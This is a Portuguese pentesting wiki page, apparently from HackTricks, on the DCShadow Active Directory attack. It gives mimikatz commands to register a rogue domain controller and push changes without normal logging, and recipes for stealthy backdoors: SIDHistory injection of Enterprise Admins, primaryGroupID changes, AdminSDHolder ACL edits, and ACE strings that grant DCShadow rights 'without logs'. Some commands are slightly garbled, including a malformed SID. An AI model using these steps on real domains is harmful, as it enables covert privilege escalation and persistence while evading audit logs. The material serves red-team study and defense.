# DCShadow

Ele registra um **novo Controlador de Domínio** no AD e o usa para **inserir atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar nenhum **registro** das **modificações**. Você **precisa de privilégios DA** e estar dentro do **domínio raiz**.\
Observe que se você usar dados incorretos, registros bastante feios aparecerão.

Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios do SYSTEM (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para inserir os valores:

{% code title="mimikatz1 (servidores RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - Necessita de DA ou similar" %}{% endcode %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Observe que **`elevate::token`** não funcionará na sessão mimikatz1, pois isso eleva os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
Você também pode selecionar um objeto "LDAP": `/object:CN=Administrador,CN=Usuários,DC=JEFFLAB,DC=local`

Você pode aplicar as alterações a partir de um DA ou de um usuário com essas permissões mínimas:

* No **objeto de domínio**:
  * _DS-Install-Replica_ (Adicionar/Remover Réplica no Domínio)
  * _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
  * _DS-Replication-Synchronize_ (Sincronização de Replicação)
* O objeto **Sites** (e seus filhos) no **contêiner de configuração**:
  * _CreateChild e DeleteChild_
* O objeto do **computador registrado como DC**:
  * _WriteProperty_ (Não Write)
* O **objeto de destino**:
  * _WriteProperty_ (Não Write)

Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para dar esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Isso significa que o nome de usuário _**student1**_ quando conectado na máquina _**mcorp-student1**_ tem permissões DCShadow sobre o objeto _**root1user**_.

## Usando DCShadow para criar backdoors

{% code title="Definir Enterprise Admins em SIDHistory para um usuário" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519 
```
{% code title="Alterar o ID do Grupo Primário (colocar usuário como membro dos Administradores do Domínio)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Modificar o ntSecurityDescriptor do AdminSDHolder (dar Controle Total a um usuário)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Dar permissões DCShadow usando DCShadow (sem logs de permissões modificadas)

Precisamos adicionar os seguintes ACEs com o SID do nosso usuário no final:

* No objeto de domínio:
  * `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;SIDdoUsuário)`
  * `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;SIDdoUsuário)`
  * `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;SIDdoUsuário)`
* No objeto do computador do atacante: `(A;;WP;;;SIDdoUsuário)`
* No objeto do usuário de destino: `(A;;WP;;;SIDdoUsuário)`
* No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;SIDdoUsuário)`

Para obter o ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Observe que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na sessão **mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração** que você deseja fazer. Dessa forma, você só precisará fazer **`/push`** uma vez para executar todas as alterações empilhadas no servidor falso.

[**Mais informações sobre DCShadow em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
